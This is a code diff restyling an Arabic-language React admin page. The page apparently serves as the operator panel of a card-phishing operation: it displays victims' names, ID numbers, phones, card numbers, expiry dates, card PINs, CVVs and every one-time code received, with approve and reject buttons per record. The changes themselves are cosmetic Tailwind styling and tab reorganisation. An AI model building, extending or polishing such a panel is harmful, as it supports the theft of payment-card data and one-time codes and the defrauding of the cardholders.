-                                    className="rounded-md cursor-pointer"
+                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
+                                      notification?.phone
+                                        ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
+                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800"
+                                    }`}
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
                                     {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
-                                    className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 text-white dark:bg-green-600" : ""}`}
+                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
+                                      notification.cardNumber
+                                        ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
+                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800"
+                                    }`}
                                     onClick={() => handleInfoClick(notification, "card")}
                                   >
                                     {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                   </Badge>
                                 </div>
 
-                                <div className="flex justify-between items-center py-2 border-t border-border/50">
+                                <div className="flex justify-between items-center py-3 border-t border-slate-200/60 dark:border-slate-700/60">
                                   <div className="flex items-center gap-2">
-                                    <span className="text-sm text-muted-foreground">الحالة:</span>
+                                    <span className="text-sm font-medium text-slate-600 dark:text-slate-400">
+                                      الحالة:
+                                    </span>
                                     {notification.status === "approved" ? (
-                                      <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">
+                                      <Badge className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800">
                                         <CheckCircle className="h-3 w-3 mr-1" />
                                         موافق
                                       </Badge>
                                     ) : notification.status === "rejected" ? (
-                                      <Badge className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300">
+                                      <Badge className="bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800">
                                         <XCircle className="h-3 w-3 mr-1" />
                                         مرفوض
                                       </Badge>
                                     ) : (
                                       <Badge
                                         variant="outline"
-                                        className="bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300"
+                                        className="bg-amber-50 text-amber-700 border-amber-200 dark:bg-amber-950/30 dark:text-amber-300 dark:border-amber-800"
                                       >
                                         <Clock className="h-3 w-3 mr-1" />
                                         معلق
@@ -1624,8 +1894,8 @@ export default function NotificationsPage() {
                                     )}
                                   </div>
                                   <div className="flex items-center gap-2">
-                                    <Clock className="h-4 w-4 text-muted-foreground" />
-                                    <span className="text-sm">
+                                    <Clock className="h-4 w-4 text-slate-400" />
+                                    <span className="text-sm text-slate-600 dark:text-slate-400">
                                       {notification.createdDate &&
                                         formatDistanceToNow(new Date(notification.createdDate), {
                                           addSuffix: true,
@@ -1635,10 +1905,10 @@ export default function NotificationsPage() {
                                   </div>
                                 </div>
 
-                                <div className="flex gap-2 mt-2 pt-2 border-t border-border/50">
+                                <div className="flex gap-2 mt-3 pt-3 border-t border-slate-200/60 dark:border-slate-700/60">
                                   <Button
                                     onClick={() => handleApproval("approved", notification.id)}
-                                    className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700 text-white"
+                                    className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm"
                                     size="sm"
                                     disabled={notification.status === "approved"}
                                   >
@@ -1647,8 +1917,7 @@ export default function NotificationsPage() {
                                   </Button>
                                   <Button
                                     onClick={() => handleApproval("rejected", notification.id)}
-                                    className="flex-1"
-                                    variant="destructive"
+                                    className="flex-1 bg-red-600 hover:bg-red-700 text-white shadow-sm"
                                     size="sm"
                                     disabled={notification.status === "rejected"}
                                   >
@@ -1663,7 +1932,7 @@ export default function NotificationsPage() {
                                   <Button
                                     variant="outline"
                                     onClick={() => handleDelete(notification.id)}
-                                    className="w-10 p-0 text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
+                                    className="w-10 p-0 text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
                                     size="sm"
                                   >
                                     <Trash2 className="h-4 w-4" />
@@ -1674,10 +1943,19 @@ export default function NotificationsPage() {
                           </Card>
                         ))
                       ) : (
-                        <div className="text-center py-8 text-muted-foreground">
-                          <div className="flex flex-col items-center gap-2">
-                            <Bell className="h-8 w-8 text-muted-foreground/50" />
-                            <p>لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
+                        <div className="text-center py-12">
+                          <div className="flex flex-col items-center gap-4">
+                            <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4">
+                              <Bell className="h-8 w-8 text-slate-400" />
+                            </div>
+                            <div>
+                              <p className="text-lg font-semibold text-slate-900 dark:text-slate-100 mb-1">
+                                لا توجد إشعارات
+                              </p>
+                              <p className="text-slate-600 dark:text-slate-400">
+                                لا توجد إشعارات متطابقة مع الفلتر المحدد
+                              </p>
+                            </div>
                           </div>
                         </div>
                       )}
@@ -1685,89 +1963,113 @@ export default function NotificationsPage() {
 
                     {/* Pagination */}
                     {filteredNotifications.length > 0 && (
-                      <div className="p-4 border-t border-border">
+                      <div className="p-6 border-t border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
                         <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
                       </div>
                     )}
                   </Card>
                 </TabsContent>
 
-                {/* Attachments Tab Content */}
-                <TabsContent value="attachments" className="space-y-6 mt-0">
-                  <Card className="bg-card shadow-sm overflow-hidden">
-                    <CardHeader className="py-3 px-4 flex flex-row items-center justify-between">
-                      <CardTitle className="text-lg flex items-center gap-2">
-                        إحصائيات 
-                                              </CardTitle>
-                    
-                    </CardHeader>
-                    <div className="w-full space-y-6 grid md:grid-cols-2">
-            {/* Activity Timeline */}
-            <Card className="mx-2">
-              <CardHeader className="">
-                <CardTitle className="text-lg flex items-center gap-2">
-                  <Calendar className="h-5 w-5 text-primary" />
-                  آخر النشاطات
-                </CardTitle>
-                <CardDescription>آخر 5 نشاطات على النظام</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <ActivityTimeline notifications={notifications} />
-              </CardContent>
-            </Card>
+                {/* Statistics Tab Content */}
+                <TabsContent value="statistics" className="space-y-6 mt-0">
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    {/* Activity Timeline */}
+                    <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60">
+                      <CardHeader className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
+                        <CardTitle className="text-lg font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
+                          <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
+                            <Calendar className="h-5 w-5 text-blue-600 dark:text-blue-400" />
+                          </div>
+                          آخر النشاطات
+                        </CardTitle>
+                        <CardDescription className="text-slate-600 dark:text-slate-400">
+                          آخر 5 نشاطات على النظام
+                        </CardDescription>
+                      </CardHeader>
+                      <CardContent className="p-6">
+                        <ActivityTimeline notifications={notifications} />
+                      </CardContent>
+                    </Card>
 
-      
-            {/* Quick Actions Card */}
-            <Card className="mx-2">
-            <CardHeader >
-                <CardTitle className="text-lg flex items-center gap-2">
-                  <Settings className="h-5 w-5 text-primary" />
-                  إجراءات سريعة
-                </CardTitle>
-              </CardHeader>
-              <CardContent className="space-y-2">
-                <Button variant="outline" className="w-full justify-start" onClick={() => setExportDialogOpen(true)}>
-                  <Download className="mr-2 h-4 w-4" />
-                  تصدير البيانات
-                </Button>
-                <Button variant="outline" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
-                  <Settings className="mr-2 h-4 w-4" />
-                  إعدادات الإشعارات
-                </Button>
-                <Button
-                  variant="outline"
-                  className="w-full justify-start text-red-500"
-                  onClick={handleClearAll}
-                  disabled={notifications.length === 0}
-                >
-                  <Trash2 className="mr-2 h-4 w-4" />
-                  مسح جميع الإشعارات
-                </Button>
-              </CardContent>
-            </Card>
-          </div>
-                  </Card>
+                    {/* Quick Actions Card */}
+                    <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60">
+                      <CardHeader className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
+                        <CardTitle className="text-lg font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
+                          <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
+                            <Settings className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
+                          </div>
+                          إجراءات سريعة
+                        </CardTitle>
+                        <CardDescription className="text-slate-600 dark:text-slate-400">
+                          الإجراءات الأكثر استخداماً
+                        </CardDescription>
+                      </CardHeader>
+                      <CardContent className="p-6 space-y-3">
+                        <Button
+                          variant="outline"
+                          className="w-full justify-start h-12 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                          onClick={() => setExportDialogOpen(true)}
+                        >
+                          <Download className="mr-3 h-5 w-5 text-blue-600 dark:text-blue-400" />
+                          <div className="text-left">
+                            <div className="font-medium text-slate-900 dark:text-slate-100">تصدير البيانات</div>
+                            <div className="text-xs text-slate-600 dark:text-slate-400">
+                              تصدير الإشعارات بصيغة CSV أو JSON
+                            </div>
+                          </div>
+                        </Button>
+                        <Button
+                          variant="outline"
+                          className="w-full justify-start h-12 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                          onClick={() => setSettingsOpen(true)}
+                        >
+                          <Settings className="mr-3 h-5 w-5 text-purple-600 dark:text-purple-400" />
+                          <div className="text-left">
+                            <div className="font-medium text-slate-900 dark:text-slate-100">إعدادات الإشعارات</div>
+                            <div className="text-xs text-slate-600 dark:text-slate-400">تخصيص إعدادات النظام</div>
+                          </div>
+                        </Button>
+                        <Button
+                          variant="outline"
+                          className="w-full justify-start h-12 border-red-200 text-red-600 hover:bg-red-50 hover:border-red-300 dark:border-red-800 dark:text-red-400 dark:hover:bg-red-950/30"
+                          onClick={handleClearAll}
+                          disabled={notifications.length === 0}
+                        >
+                          <Trash2 className="mr-3 h-5 w-5" />
+                          <div className="text-left">
+                            <div className="font-medium">مسح جميع الإشعارات</div>
+                            <div className="text-xs opacity-75">حذف جميع الإشعارات نهائياً</div>
+                          </div>
+                        </Button>
+                      </CardContent>
+                    </Card>
+                  </div>
                 </TabsContent>
               </Tabs>
             </div>
           </div>
-          {/* Sidebar - 1/3 width on large screens */}
-       
         </div>
       </div>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-md" dir="rtl">
-          <DialogHeader>
-            <DialogTitle className="flex items-center gap-2 text-xl">
+        <DialogContent
+          className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 max-w-[90vw] md:max-w-md shadow-xl"
+          dir="rtl"
+        >
+          <DialogHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
+            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
               {selectedInfo === "personal" ? (
                 <>
-                  <Users className="h-5 w-5 text-primary" />
+                  <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
+                    <Users className="h-5 w-5 text-blue-600 dark:text-blue-400" />
+                  </div>
                   المعلومات الشخصية
                 </>
               ) : selectedInfo === "card" ? (
                 <>
-                  <CreditCard className="h-5 w-5 text-primary" />
+                  <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
+                    <CreditCard className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
+                  </div>
                   معلومات البطاقة
                 </>
               ) : (
@@ -1776,66 +2078,72 @@ export default function NotificationsPage() {
             </DialogTitle>
           </DialogHeader>
           {selectedInfo === "personal" && selectedNotification && (
-            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
+            <div className="space-y-1 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700 mt-4">
               {selectedNotification.idNumber && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">رقم الهوية:</span>
-                  <span className="font-semibold">{selectedNotification.idNumber}</span>
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم الهوية:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.idNumber}</span>
                 </div>
               )}
               {selectedNotification.email && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">البريد الإلكتروني:</span>
-                  <span className="font-semibold">{selectedNotification.email}</span>
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">البريد الإلكتروني:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.email}</span>
                 </div>
               )}
-              {selectedNotification.mobile && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">رقم الجوال:</span>
-                  <span className="font-semibold">{selectedNotification.mobile}</span>
+              {selectedNotification?.phone && (
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم الجوال:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification?.phone}</span>
                 </div>
               )}
               {selectedNotification.name && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">الاسم:</span>
-                  <span className="font-semibold">{selectedNotification.name}</span>
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">الاسم:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.name}</span>
                 </div>
               )}
               {selectedNotification.phone && (
-                <div className="flex justify-between items-center py-2">
-                  <span className="font-medium text-muted-foreground">الهاتف:</span>
-                  <span className="font-semibold">{selectedNotification.phone}</span>
+                <div className="flex justify-between items-center py-3">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">الهاتف:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.phone}</span>
                 </div>
               )}
             </div>
           )}
           {selectedInfo === "card" && selectedNotification && (
-            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
+            <div className="space-y-1 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700 mt-4">
               {selectedNotification.bank && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">البنك:</span>
-                  <span className="font-semibold">{selectedNotification.bank}</span>
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">البنك:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.bank}</span>
                 </div>
               )}
               {selectedNotification.cardNumber && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
-                  <div className="font-semibold" dir="ltr">
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم البطاقة:</span>
+                  <div className="font-bold" dir="ltr">
                     {selectedNotification.prefix && (
-                      <Badge variant="outline" className="bg-blue-100 dark:bg-blue-900 mr-1">
+                      <Badge
+                        variant="outline"
+                        className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 mr-1 font-mono"
+                      >
                         {selectedNotification.prefix}
                       </Badge>
                     )}
-                    <Badge variant="outline" className="bg-green-100 dark:bg-green-900">
+                    <Badge
+                      variant="outline"
+                      className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-mono"
+                    >
                       {selectedNotification.cardNumber}
                     </Badge>
                   </div>
                 </div>
               )}
               {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
-                  <span className="font-semibold">
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">تاريخ الانتهاء:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">
                     {selectedNotification.year && selectedNotification.month
                       ? `${selectedNotification.year}/${selectedNotification.month}`
                       : selectedNotification.cardExpiry}
@@ -1843,34 +2151,38 @@ export default function NotificationsPage() {
                 </div>
               )}
               {selectedNotification.pass && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
-                  <span className="font-semibold">{selectedNotification.pass}</span>
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز البطاقة:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.pass}</span>
                 </div>
               )}
               {(selectedNotification.otp || selectedNotification.otpCode) && (
-                <div className="flex justify-between items-center py-2 border-b border-border/50">
-                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
-                  <Badge className="font-semibold bg-green-600">
+                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز التحقق المرسل:</span>
+                  <Badge className="font-bold bg-emerald-600 text-white font-mono">
                     {selectedNotification.otp}
                     {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                   </Badge>
                 </div>
               )}
               {selectedNotification.cvv && (
-                <div className="flex justify-between items-center py-2">
-                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
-                  <span className="font-semibold">{selectedNotification.cvv}</span>
+                <div className="flex justify-between items-center py-3">
+                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز الامان:</span>
+                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.cvv}</span>
                 </div>
               )}
               {selectedNotification.allOtps &&
                 Array.isArray(selectedNotification.allOtps) &&
                 selectedNotification.allOtps.length > 0 && (
-                  <div className="pt-2 border-t border-border/50">
-                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
+                  <div className="pt-3 border-t border-slate-200/60 dark:border-slate-700/60">
+                    <span className="font-semibold text-slate-600 dark:text-slate-400 block mb-3">جميع الرموز:</span>
                     <div className="flex flex-wrap gap-2">
                       {selectedNotification.allOtps.map((otp, index) => (
-                        <Badge key={index} variant="outline" className="bg-muted">
+                        <Badge
+                          key={index}
+                          variant="outline"
+                          className="bg-slate-100 text-slate-700 border-slate-300 dark:bg-slate-800 dark:text-slate-300 dark:border-slate-600 font-mono"
+                        >
                           {otp}
                         </Badge>
                       ))}
